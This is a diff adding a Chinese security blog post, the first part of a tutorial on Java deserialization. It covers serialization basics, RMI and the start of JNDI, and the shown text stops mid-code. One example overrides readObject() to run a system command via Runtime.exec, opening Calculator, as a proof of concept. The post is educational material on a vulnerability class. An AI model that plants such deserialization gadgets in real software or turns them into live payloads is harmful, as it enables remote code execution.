@@ -1,0 +1,1127 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+  <meta name="google-site-verification" content="9I2ZJGCGSFZ3JOIR2o2ugq8lnm-NLadndUPsCsXXgFc">
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="java unserialize">
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0">
+
+
+
+
+
+
+<meta name="description" content="从一则代码谈谈什么是java反序列化123456789101112131415161718192021222324package com.xdsec;import java.io.*;public class test &amp;#123;    public static void main(String args[])throws Exception&amp;#123;        //定义str字符串">
+<meta name="keywords" content="java unserialize">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从零开始的JAVA反序列化(一)">
+<meta property="og:url" content="http://pupiles.com/java_unserialize1.html">
+<meta property="og:site_name" content="Pupiles blog">
+<meta property="og:description" content="从一则代码谈谈什么是java反序列化123456789101112131415161718192021222324package com.xdsec;import java.io.*;public class test &amp;#123;    public static void main(String args[])throws Exception&amp;#123;        //定义str字符串">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/Snipaste_2018-12-20_00-45-51.png">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/Snipaste_2018-12-20_00-40-19.png">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/Snipaste_2018-12-20_00-40-04.png">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/Snipaste_2018-12-20_00-45-24.png">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/Snipaste_2018-12-20_00-39-32.png">
+<meta property="og:updated_time" content="2018-12-19T17:56:44.904Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="从零开始的JAVA反序列化(一)">
+<meta name="twitter:description" content="从一则代码谈谈什么是java反序列化123456789101112131415161718192021222324package com.xdsec;import java.io.*;public class test &amp;#123;    public static void main(String args[])throws Exception&amp;#123;        //定义str字符串">
+<meta name="twitter:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/Snipaste_2018-12-20_00-45-51.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"always","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://pupiles.com/java_unserialize1.html">
+
+
+
+
+
+  <title> 从零开始的JAVA反序列化(一) | Pupiles blog </title>
+</head>
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?a5cad5e7b7a8b5d3aea9f10d80c9f2b7";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Pupiles blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">菜的要死的程序猿和Web狗</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            友链
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  
+  <div class="algolia-popup popup search-popup">
+    <div class="algolia-search">
+      <div class="algolia-search-input-icon">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="algolia-search-input" id="algolia-search-input"></div>
+    </div>
+
+    <div class="algolia-results">
+      <div id="algolia-stats"></div>
+      <div id="algolia-hits"></div>
+      <div id="algolia-pagination" class="algolia-pagination"></div>
+    </div>
+
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+  </div>
+
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope="" itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://pupiles.com/java_unserialize1.html">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Pupil">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/touxiang.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pupiles blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+            
+            
+              
+                从零开始的JAVA反序列化(一)
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-20T01:55:35+08:00">
+                2018-12-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/learning-and-think/" itemprop="url" rel="index">
+                    <span itemprop="name">learning and think</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a class="cloud-tie-join-count" href="/java_unserialize1.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count join-count" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/java_unserialize1.html" class="leancloud_visitors" data-flag-title="从零开始的JAVA反序列化(一)">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h4 id="从一则代码谈谈什么是java反序列化"><a href="#从一则代码谈谈什么是java反序列化" class="headerlink" title="从一则代码谈谈什么是java反序列化"></a>从一则代码谈谈什么是java反序列化</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xdsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span><span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//定义str字符串</span></span><br><span class="line">        String str=<span class="string">"hello world!"</span>;</span><br><span class="line">        <span class="comment">//创建一个包含对象进行反序列化信息的数据文件</span></span><br><span class="line">        FileOutputStream fos=<span class="keyword">new</span> FileOutputStream(<span class="string">"pupiles"</span>);</span><br><span class="line">        ObjectOutputStream os=<span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        <span class="comment">//writeObject()方法将obj对象写入object文件</span></span><br><span class="line">        os.writeObject(str);</span><br><span class="line">        os.close();</span><br><span class="line">        <span class="comment">//反序列化str对象</span></span><br><span class="line">        FileInputStream fis=<span class="keyword">new</span> FileInputStream(<span class="string">"pupiles"</span>);</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        <span class="comment">//获得对象</span></span><br><span class="line">        String str2=(String)ois.readObject();</span><br><span class="line">        System.out.print(str2);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们可以通过<code>os.writeObject</code>将我们的str对象写入文件中，接着，通过<code>os.readObject</code>将我们的对象从序列化文件中恢复。那我们先来看看写入的文件长什么样<br><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/Snipaste_2018-12-20_00-45-51.png" alt=" https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/Snipaste_2018-12-20_00-45-51.png"><br>记住这里文件的前五个字节aced0005是java序列化文件的文件头。<br>看到这里肯定有很多同学有疑问，为什么要用复杂的反序列化，的确，在单一程序代码中使用序列化确实是很麻烦，但是如果在处理跨平台的数据传输和对对象和类的传输的时候却是非常重要的手段。</p>
+<h4 id="第二段代码"><a href="#第二段代码" class="headerlink" title="第二段代码"></a>第二段代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xdsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test2</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//定义myObj对象</span></span><br><span class="line">        MyObject myObj = <span class="keyword">new</span> MyObject();</span><br><span class="line">        myObj.name = <span class="string">"pupiles"</span>;</span><br><span class="line">        <span class="comment">//创建一个包含对象进行反序列化信息的”object”数据文件</span></span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"pupiles2"</span>);</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        <span class="comment">//writeObject()方法将myObj对象写入object文件</span></span><br><span class="line">        os.writeObject(myObj);</span><br><span class="line">        os.close();</span><br><span class="line">        <span class="comment">//从文件中反序列化obj对象</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"pupiles2"</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        <span class="comment">//恢复对象</span></span><br><span class="line">        MyObject objectFromDisk = (MyObject)ois.readObject();</span><br><span class="line">        System.out.println(objectFromDisk.name);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyObject</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="comment">//重写readObject()方法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span>&#123;</span><br><span class="line">        <span class="comment">//执行默认的readObject()方法</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="comment">//打开计算器程序命令</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"open /Applications/Calculator.app/"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这次我们自己写了一个class<code>MyObject</code>。我们看到，MyObject类有一个公有属性name，myObj实例化后将myObj.name赋值为了“pupiles”，然后序列化写入文件pupiles2，然后反序列化<br><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/Snipaste_2018-12-20_00-40-19.png" alt=" https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/Snipaste_2018-12-20_00-40-19.png"><br>这里弹出计算器的原因是我们重写了MyObject的readObject方法(注意这里MyObject需要实现Serializable的接口，否则该类无法进行序列化)<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span>&#123;</span><br><span class="line">        <span class="comment">//执行默认的readObject()方法</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="comment">//打开计算器程序命令</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"open /Applications/Calculator.app/"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>所以当main函数调用反序列化的readObject方法的时候会打开计算器</p>
+<h4 id="反序列化与RMI和JDNI之间的小故事"><a href="#反序列化与RMI和JDNI之间的小故事" class="headerlink" title="反序列化与RMI和JDNI之间的小故事"></a>反序列化与RMI和JDNI之间的小故事</h4><p>很多同学会说怎么可能会有人这么写代码呢，当然不会，我们接下来继续看<br>先来介绍一下RMI和JDNI<br>RMI<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RMI是Remote Method Invoke的缩写，是JDK提供的一个完善的、简单易用的远程调用框架，它要求客户端和服务器端都是Java程序。下面简述RMI的基本原理：如下图所示，RMI采用代理来负责客户端和服务器之间socket通信的细节。RMI框架分别为远程对象生成了客户端代理和服务器端代理，位于客户端的代理称为存根（Stub），位于服务器端的代理称为骨架（Skeleton）。</span><br><span class="line"></span><br><span class="line">远程对象会在客户端生成存根对象。当客户端调用远程对象的方法时，实际上是调用本地存根的相应方法。然后，存根会把被访问的远程对象名、方法名以及参数编组后发送给服务器，由骨架去调用相应的远程方法并把返回值或异常返回给客户端。</span><br></pre></td></tr></table></figure></p>
+<p>创建一个RMI程序的基本步骤：<br>（1）创建远程接口，继承java.rmi.Remote接口；<br>（2）创建远程类，实现远程接口；<br>（3）创建服务器程序，在rmiregistry注册表中注册远程对象；<br>（4）创建客户端程序，负责定位远程对象，并且调用远程方法。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="comment">// 实现Remote接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">HelloService</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">service</span><span class="params">(String data)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="comment">// Inherit UnicastRemoteObject and implement HelloService interface</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloServiceImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span></span></span><br><span class="line"><span class="class">        <span class="keyword">implements</span> <span class="title">HelloService</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloServiceImpl</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="comment">// UnicastRemoteObject.exportObject(this, 0);</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">service</span><span class="params">(String data)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> data + name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"> </span><br><span class="line">            HelloService service1 = <span class="keyword">new</span> HelloServiceImpl(<span class="string">"service1"</span>);</span><br><span class="line">            Context namingContext = <span class="keyword">new</span> InitialContext();</span><br><span class="line">            namingContext.rebind(<span class="string">"rmi://localhost:1099/HelloService1"</span>,</span><br><span class="line">                    service1);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (RemoteException | NamingException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"Successfully register a remote object."</span>);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        String url = <span class="string">"rmi://localhost:1099/"</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Context namingContext = <span class="keyword">new</span> InitialContext();</span><br><span class="line">            HelloService serv = (HelloService) namingContext.lookup(</span><br><span class="line">                    url + <span class="string">"HelloService1"</span>);</span><br><span class="line">            String data = <span class="string">"This is RMI Client."</span>;</span><br><span class="line">            System.out.println(serv.service(data));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NamingException | RemoteException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>说到这里可能有的同学就要说如果在目标服务器上存在lookup函数并且参数可控的话，我们就可以恶意注册一个rmi服务器去供其调用，实现RCE。其实并不是如此，我们来看一下rmi的执行过程<br><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/Snipaste_2018-12-20_00-40-04.png" alt=" https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/Snipaste_2018-12-20_00-40-04.png"></p>
+<ol>
+<li>rmi服务注册他的名字和IP到RMI注册中心（bind）</li>
+<li>rmi客户端通过IP和名字去RMI注册中心找相应的服务（lookup）</li>
+<li>rmi Stub序列化调用的方法和参数编组后传给rmi Skeleton(call)</li>
+<li>rmi skeleton执行stub的逆过程，调用真实的server类执行该方法（invocation）</li>
+<li>rmi skeleton将调用函数的结果返回给stub（return）</li>
+</ol>
+<p>所以真正执行该函数是在远程服务端，执行完成后会将结果序列化返回给应用端，客户端是不执行代码的，这点一定要搞清楚。<br>我们继续来看看JDNI<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JNDI - Java Naming and Directory Interface 名为 Java命名和目录接口，具体的概念还是比较复杂难懂，具体结构设计细节可以不用了解，简单来说就是 JNDI 提供了一组通用的接口可供应用很方便地去访问不同的后端服务，例如 LDAP、RMI、CORBA 等。在 Java 中为了能够更方便的管理、访问和调用远程的资源对象，常常会使用 LDAP 和 RMI 等服务来将资源对象或方法绑定在固定的远程服务端，供应用程序来进行访问和调用。为了更好的理解整个 JNDI 注入产生的原因，下面用实际代码来说明一下常规 RMI 访问和使用 JNDI 访问 RMI 的区别。</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xdsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jdniServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 配置 JNDI 默认设置</span></span><br><span class="line">        Properties env = <span class="keyword">new</span> Properties();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY,</span><br><span class="line">                <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL,</span><br><span class="line">                <span class="string">"rmi://localhost:1099"</span>);</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext(env);</span><br><span 